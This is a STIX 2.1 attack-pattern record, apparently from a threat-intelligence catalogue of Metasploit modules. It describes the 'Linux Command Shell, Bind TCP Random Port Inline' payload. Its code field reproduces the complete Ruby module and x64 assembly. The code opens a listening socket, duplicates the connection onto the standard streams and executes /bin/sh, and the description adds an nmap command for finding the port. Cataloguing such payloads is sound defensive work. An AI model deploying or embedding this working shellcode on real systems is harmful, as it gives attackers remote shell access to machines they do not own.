{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1637bde3-28a9-4062-ac3d-3d5a4f362a9c",
    "created": "2024-08-14T16:33:19.4589Z",
    "modified": "2024-08-14T16:33:19.458904Z",
    "name": "Linux Command Shell, Bind TCP Random Port Inline",
    "description": " Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/shell_bind_tcp_random_port.rb",
            "external_id": "shell_bind_tcp_random_port.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 51\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',\n      'Description'   => %q{\n        Listen for a connection in a random port and spawn a command shell.\n        Use nmap to discover the open port: 'nmap -sS target -p-'.\n      },\n      'Author'        => 'Geyslan G. Bem <geyslan[at]gmail.com>',\n      'License'       => BSD_LICENSE,\n      'References'    => [['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm']],\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64\n    ))\n  end\n\n  def generate(opts={})\n    payload = %Q^\n      ; Creating the socket file descriptor\n      ; int socket(int domain, int type, int protocol);\n      ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)\n\n      ; socket arguments (bits/socket.h, netinet/in.h)\n\n      ; Avoiding garbage\n      ; These push and pop unset the sign bit in rax used for cdq\n      push 41       ; syscall 41 - socket\n      pop rax\n\n      ; Zeroing rdx, search about cdq instruction for understanding\n      cdq           ; IPPROTO_IP = 0 (int) - rdx\n\n      push 1        ; SOCK_STREAM = 1 (int)\n      pop rsi\n\n      push 2        ; AF_INET = 2 (int)\n      pop rdi\n\n                    ; syscall 41 (rax) - socket\n      syscall       ; kernel interruption\n\n\n      ; Preparing to listen the incoming connection (passive socket)\n      ; int listen(int sockfd, int backlog);\n      ; listen(sockfd, int);\n\n      ; listen args ; just let rsi (backlog) as 1 - man(2) listen\n\n      xchg eax, edi ; put the file descriptor returned by socket() into rdi\n\n      mov al, 50    ; syscall 50 - listen\n      syscall       ; kernel interruption\n\n\n      ; Accepting the incoming connection\n      ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);\n      ; accept(sockfd, NULL, NULL)\n\n      ; accept args ; rdi already contains the sockfd, likewise rdx contains 0\n\n      xchg eax, esi ; put listen() return (0) into rsi\n\n      mov al, 43    ; syscall 43 - accept\n      syscall       ; kernel interruption\n\n\n      ; Creating a interchangeably copy of the file descriptors\n      ; int dup2(int oldfd, int newfd);\n      ; dup2(clientfd, ...)\n\n      xchg edi, eax ; put the clientfd returned from accept into rdi\n      xchg esi, eax ; put the sockfd integer into rsi to use as the loop counter\n\n    dup_loop:\n      dec esi       ; decrement loop counter\n\n      push 33       ; syscall 33 - dup2\n      pop rax\n      syscall       ; kernel interruption\n\n      jnz dup_loop\n\n\n      ; Finally, using execve to substitute the actual process with /bin/sh\n      ; int execve(const char *filename, char *const argv[], char *const envp[]);\n      ; exevcve(\"//bin/sh\", NULL, NULL)\n\n      ; execve string argument\n                    ; *envp[] rdx is already NULL\n                    ; *argv[] rsi is already NULL\n      push rdx      ; put NULL terminating string\n      mov rdi, 0x68732f6e69622f2f ; \"//bin/sh\"\n      push rdi      ; push //bin/sh string\n      push rsp      ; push the stack pointer\n      pop rdi       ; pop it (string address) into rdi\n\n      mov al, 59    ; execve syscall\n      syscall       ; bingo\n    ^\n    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}